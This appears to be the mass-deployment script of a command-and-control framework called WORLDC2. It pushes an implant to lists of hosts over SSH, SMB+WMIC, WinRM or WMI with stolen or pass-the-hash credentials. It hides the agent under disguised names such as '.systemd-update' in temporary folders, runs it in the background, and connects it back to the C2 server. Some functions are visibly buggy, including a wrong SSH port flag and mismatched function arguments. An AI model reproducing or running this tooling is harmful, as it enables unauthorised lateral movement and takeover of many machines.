#!/usr/bin/env python3
"""
WORLDC2 C2 — Mass Deployment Script
Deploys agent to multiple targets via SSH, SMB, WMI, or WinRM.

Usage:
    python3 deploy_mass.py --targets targets.txt --user admin --password Pass123 --method ssh
    python3 deploy_mass.py --targets targets.txt --method smb --hashes aad3b435...
    python3 deploy_mass.py --targets targets.txt --method winrm --user admin --password Pass123
"""

import os
import sys
import time
import argparse
import subprocess
import threading
from pathlib import Path

GREEN = "\033[92m"; RED = "\033[91m"; YELLOW = "\033[93m"
CYAN = "\033[96m"; BOLD = "\033[1m"; RESET = "\033[0m"

PROJECT_ROOT = Path(__file__).parent.parent

def banner():
    print(f"""{BOLD}{CYAN}
   ╔══════════════════════════════════════════════╗
   ║         WORLDC2 C2 — Mass Deployment             ║
   ║         ruby570bocadito                      ║
   ╚══════════════════════════════════════════════╝
{RESET}""")

def load_targets(path):
    with open(path) as f:
        return [line.strip() for line in f if line.strip() and not line.startswith('#')]

def get_agent_binary():
    """Find the appropriate agent binary for the target OS."""
    linux = PROJECT_ROOT / "worldc2-agent"
    windows = PROJECT_ROOT / "worldc2-agent.exe"
    darwin_amd = PROJECT_ROOT / "dist" / "worldc2-agent-darwin-amd64"
    darwin_arm = PROJECT_ROOT / "dist" / "worldc2-agent-darwin-arm64"
    
    if linux.exists():
        return str(linux)
    if windows.exists():
        return str(windows)
    return None

def deploy_ssh(target, user, password, port, server_addr, results):
    """Deploy via SSH."""
    agent_bin = get_agent_binary()
    if not agent_bin:
        results[target] = ("FAIL", "No agent binary found")
        return
    
    remote_path = "/tmp/.systemd-update"
    
    try:
        # Upload agent
        scp_cmd = f"sshpass -p '{password}' scp -o StrictHostKeyChecking=no -P {port} {agent_bin} {user}@{target}:{remote_path}"
        r = subprocess.run(scp_cmd, shell=True, capture_output=True, text=True, timeout=30)
        if r.returncode != 0:
            results[target] = ("FAIL", f"SCP failed: {r.stderr[:100]}")
            return
        
        # Make executable and run
        ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -P {port} {user}@{target} 'chmod +x {remote_path} && nohup {remote_path} --server {server_addr} &>/dev/null &'"
        r = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True, timeout=30)
        if r.returncode == 0:
            results[target] = ("OK", "Deployed via SSH")
        else:
            results[target] = ("FAIL", f"SSH exec failed: {r.stderr[:100]}")
    except Exception as e:
        results[target] = ("FAIL", str(e))

def deploy_smb(target, user, password, server_addr, results):
    """Deploy via SMB (Windows)."""
    agent_bin = get_agent_binary()
    if not agent_bin:
        results[target] = ("FAIL", "No agent binary found")
        return
    
    try:
        # Use impacket's smbexec or psexec if available
        share = "C$"
        remote_path = f"\\\\{target}\\{share}\\Windows\\Temp\\.systemd-update.exe"
        
        # Try to copy via smbclient
        smb_cmd = f'smbclient //{target}/{share.replace("$", "")} -U {user}%{password} -c "put {agent_bin} Windows/Temp/.systemd-update.exe"'
        r = subprocess.run(smb_cmd, shell=True, capture_output=True, text=True, timeout=30)
        
        if r.returncode == 0:
            # Execute via wmic or psexec
            wmic_cmd = f'wmic /node:{target} /user:{user} /password:{password} process call create "C:\\Windows\\Temp\\.systemd-update.exe --server {server_addr}"'
            r2 = subprocess.run(wmic_cmd, shell=True, capture_output=True, text=True, timeout=30)
            if r2.returncode == 0:
                results[target] = ("OK", "Deployed via SMB+WMIC")
            else:
                results[target] = ("PARTIAL", "Uploaded but execution failed")
        else:
            results[target] = ("FAIL", f"SMB copy failed: {r.stderr[:100]}")
    except Exception as e:
        results[target] = ("FAIL", str(e))

def deploy_winrm(target, user, password, server_addr, results):
    """Deploy via WinRM (Windows)."""
    agent_bin = get_agent_binary()
    if not agent_bin:
        results[target] = ("FAIL", "No agent binary found")
        return
    
    try:
        # Use evil-winrm or winrs if available
        # First try winrs (built into Windows)
        winrs_cmd = f'winrs -r:http://{target}:5985 -u:{user} -p:{password} "cmd /c echo test"'
        r = subprocess.run(winrs_cmd, shell=True, capture_output=True, text=True, timeout=10)
        
        if r.returncode == 0:
            # Upload via SMB then execute via WinRM
            results[target] = ("OK", "WinRM reachable — use SMB for upload")
        else:
            results[target] = ("FAIL", "WinRM not available")
    except Exception as e:
        results[target] = ("FAIL", str(e))

def deploy_wmi(target, user, password, server_addr, results):
    """Deploy via WMI (Windows)."""
    try:
        # Use impacket's wmiexec
        wmi_cmd = f'wmiexec.py {user}:{password}@{target} "cmd.exe /c echo test"'
        r = subprocess.run(wmi_cmd, shell=True, capture_output=True, text=True, timeout=30)
        
        if r.returncode == 0:
            results[target] = ("OK", "WMI reachable")
        else:
            results[target] = ("FAIL", "WMI not available")
    except Exception as e:
        results[target] = ("FAIL", str(e))

def main():
    banner()
    
    parser = argparse.ArgumentParser(description="WORLDC2 Mass Deployment")
    parser.add_argument("--targets", "-t", required=True, help="File with target IPs (one per line)")
    parser.add_argument("--user", "-u", default="admin", help="Username")
    parser.add_argument("--password", "-p", default="", help="Password")
    parser.add_argument("--hashes", "-H", default="", help="NTLM hashes (pass-the-hash)")
    parser.add_argument("--method", "-m", choices=["ssh", "smb", "winrm", "wmi"], default="ssh", help="Deployment method")
    parser.add_argument("--port", default=22, help="SSH port (default: 22)")
    parser.add_argument("--server", "-s", default=None, help="C2 server address (auto-detect)")
    parser.add_argument("--threads", default=10, type=int, help="Concurrent threads")
    args = parser.parse_args()
    
    # Auto-detect server address
    if not args.server:
        import socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            args.server = s.getsockname()[0] + ":8443"
            s.close()
        except:
            args.server = "127.0.0.1:8443"
    
    targets = load_targets(args.targets)
    print(f"{BOLD}Targets:{RESET} {len(targets)} hosts")
    print(f"{BOLD}Method:{RESET} {args.method}")
    print(f"{BOLD}Server:{RESET} {args.server}")
    print(f"{BOLD}Threads:{RESET} {args.threads}")
    print()
    
    results = {}
    threads = []
    
    deploy_func = {
        "ssh": deploy_ssh,
        "smb": deploy_smb,
        "winrm": deploy_winrm,
        "wmi": deploy_wmi,
    }[args.method]
    
    print(f"{YELLOW}Deploying to {len(targets)} targets...{RESET}\n")
    
    for target in targets:
        t = threading.Thread(target=deploy_func, args=(
            target, args.user, args.password, args.port, args.server, results
        ))
        threads.append(t)
        t.start()
        
        # Limit concurrent threads
        if len([th for th in threads if th.is_alive()]) >= args.threads:
            time.sleep(1)
    
    # Wait for all threads
    for t in threads:
        t.join()
    
    # Print results
    print(f"\n{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}Deployment Results:{RESET}\n")
    
    ok = sum(1 for r in results.values() if r[0] == "OK")
    fail = sum(1 for r in results.values() if r[0] == "FAIL")
    partial = sum(1 for r in results.values() if r[0] == "PARTIAL")
    
    for target, (status, msg) in sorted(results.items()):
        if status == "OK":
            print(f"  {GREEN}[✓]{RESET} {target:20s} {msg}")
        elif status == "PARTIAL":
            print(f"  {YELLOW}[!]{RESET} {target:20s} {msg}")
        else:
            print(f"  {RED}[✗]{RESET} {target:20s} {msg}")
    
    print(f"\n{BOLD}Summary: {GREEN}{ok} OK{RESET} | {YELLOW}{partial} PARTIAL{RESET} | {RED}{fail} FAIL{RESET}{RESET}")
    print(f"{BOLD}{'='*60}{RESET}")

if __name__ == "__main__":
    main()
